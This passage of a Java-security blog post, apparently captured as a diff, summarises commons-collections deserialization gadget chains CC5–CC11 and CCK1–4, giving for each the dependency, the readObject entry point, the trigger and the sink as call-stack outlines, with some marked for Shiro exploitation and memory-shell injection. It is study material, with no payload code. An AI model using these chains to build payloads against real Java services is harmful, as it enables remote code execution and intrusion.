+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">PriorityQueue.readObject()<br>  ...<br>     TransformingComparator.compare()<br>           InstantiateTransformer.transform() <br>       		TrAXFilter.newInstance()<br>       			TransformerImpl.newTransformer()<br>       				&lt;Templates&gt;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><ul>
+<li>DEP：commons-collections:3.1</li>
+<li>IN：BadAttributeValueExpException.readObject()</li>
+<li>OUT：LazyMap.get()</li>
+<li>SINK：transformers-chain</li>
+</ul>
+<blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">BadAttributeValueExpException.readObject()<br>      TiedMapEntry.toString()<br>           LazyMap.get()<br>               ChainedTransformer.transform()<br>               		&lt;transformers-chain&gt;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><ul>
+<li>DEP：commons-collections:3.1</li>
+<li>IN：HashMap.readObject() || HashSet.readObject()</li>
+<li>OUT：LazyMap.get()</li>
+<li>SINK：transformers-chain</li>
+</ul>
+<p>1.HashMap版本(Lite)</p>
+<blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">HashMap.readObject()<br>       HashMap.<span class="hljs-built_in">hash</span>()<br>           TiedMapEntry.hashCode()<br>              TiedMapEntry.getValue()<br>                 LazyMap.get()<br>		ChainedTransformer.transform()<br>			&lt;transformers-chain&gt;<br></code></pre></td></tr></table></figure>
+
+
+</blockquote>
+<p>2.HashSet版本</p>
+<blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">HashSet.readObject()<br>    HashMap.put()<br>       HashMap.<span class="hljs-built_in">hash</span>()<br>           TiedMapEntry.hashCode()<br>              TiedMapEntry.getValue()<br>                 LazyMap.get()<br>		ChainedTransformer.transform()<br>			&lt;transformers-chain&gt;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><ul>
+<li>DEP：commons-collections:3.1</li>
+<li>IN：Hashtable.readObject()</li>
+<li>OUT：LazyMap.get()</li>
+<li>SINK：transformers-chain</li>
+</ul>
+<blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"> Hashtable.readObject()<br>Hashtable.reconstitutionPut()<br> 		AbstractMapDecorator.equals()<br> 			AbstractMap.equals()<br> 				LazyMap.get()<br> 					ChainedTransformer.transform()<br> 						&lt;transformers-chain&gt;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="CC8"><a href="#CC8" class="headerlink" title="CC8"></a>CC8</h2><ul>
+<li>DEP：commons-collections4:4.0</li>
+<li>IN：TreeBag.readObject()</li>
+<li>OUT：TransformingComparator.compare()</li>
+<li>SINK：Templates</li>
+</ul>
+<blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">org.apache.commons.collections4.bag.TreeBag.readObject<br>org.apache.commons.collections4.bag.AbstractMapBag.doReadObject<br>java.util.TreeMap.put<br>java.util.TreeMap.compare<br>org.apache.commons.collections4.comparators.TransformingComparator.compare<br>	InvokerTransformer.transform -&gt; TransformerImpl.newTransformer()<br>		&lt;Templates&gt;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="CC9"><a href="#CC9" class="headerlink" title="CC9"></a>CC9</h2><ul>
+<li>DEP：commons-collections:3.1</li>
+<li>IN：Hashtable.readObject()</li>
+<li>OUT：LazyMap.get()</li>
+<li>SINK：transformers-chain</li>
+</ul>
+<blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">java.util.Hashtable.readObject<br>    java.util.Hashtable.reconstitutionPut<br>      org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()<br>        org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()<br>            org.apache.commons.collections.map.LazyMap.get()<br>            	&lt;transformers-chain&gt;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="CC10"><a href="#CC10" class="headerlink" title="CC10"></a>CC10</h2><ul>
+<li>DEP：commons-collections:3.2.1</li>
+<li>IN：HashSet.readObject()</li>
+<li>OUT：LazyMap.get()</li>
+<li>SINK：Templates</li>
+</ul>
+<blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">java.util.HashSet.readObject()<br>    java.util.HashMap.put()<br>    java.util.HashMap.<span class="hljs-built_in">hash</span>()<br>        org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()<br>          org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()<br>            org.apache.commons.collections.map.LazyMap.get()<br>               		InvokerTransformer.transform() -&gt; TransformerImpl.newTransformer()<br>               			&lt;Templates&gt;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="CC11"><a href="#CC11" class="headerlink" title="CC11"></a>CC11</h2><ul>
+<li>DEP：commons-collections:3.2.1</li>
+<li>IN：BadAttributeValueExpException.readObject()</li>
+<li>OUT：LazyMap.get()</li>
+<li>SINK：Templates</li>
+</ul>
+<blockquote>
+<p>modify from Payload CC5.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">BadAttributeValueExpException.readObject()<br>      TiedMapEntry.toString()<br>           LazyMap.get()<br>               InvokerTransformer.transform() -&gt; TransformerImpl.newTransformer()<br>            	   &lt;Templates&gt;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="CCK1-x2F-2"><a href="#CCK1-x2F-2" class="headerlink" title="CCK1&#x2F;2"></a>CCK1&#x2F;2</h2><ul>
+<li>DEP：commons-collections:&lt;&#x3D;3.2.1 || commons-collections4:4.0</li>
+<li>IN：HashMap.readObject()</li>
+<li>OUT：LazyMap.get()</li>
+<li>SINK：Templates</li>
+</ul>
+<blockquote>
+<p>For shiro-exploit. MemShell Injection.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">HashMap.readObject<br>  TiedMapEntry.hashCode<br>    TiedMapEntry.getValue<br>      LazyMap.get<br>        InvokerTransformer.transform -&gt; TransformerImpl.newTransformer()<br>          &lt;Templates&gt;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="CCK3-x2F-4"><a href="#CCK3-x2F-4" class="headerlink" title="CCK3&#x2F;4"></a>CCK3&#x2F;4</h2><ul>
+<li>DEP：commons-collections:&lt;&#x3D;3.2.1 || commons-collections4:4.0</li>
+<li>IN：HashMap.readObject()</li>
+<li>OUT：LazyMap.get()</li>
+<li>SINK：Templates</li>
+</ul>
+<blockquote>
+<p>For shiro-exploit.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">  HashMap.readObject<br>    TiedMapEntry.hashCode<br>      TiedMapEntry.getValue<br>        LazyMap.get<br>&lt;transformers-chain&gt;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><p><a target="_blank" rel="noopener" href="https://su18.org/post/ysuserial/">Java 反序列化取经路 | 素十八 (su18.org)</a></p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/ysoserial-su18-2">https://su18.org/post/ysoserial-su18-2</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1538">https://forum.butian.net/share/1538</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/java%E5%AE%89%E5%85%A8/" class="category-chain-item">java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java%E5%AE%89%E5%85%A8/">#java安全</a>
+      
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java反序列化漏洞(一)</div>
+      <div>http://example.com/2023/05/25/Java反序列化漏洞(一)/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>springtime</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>May 25, 2023</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>Licensed under</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/05/28/security-issues-in-Go/" title="security_issues_in_Go">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">security_issues_in_Go</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/05/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PyYaml反序列化">
+                        <span class="hidden-mobile">PyYaml反序列化</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
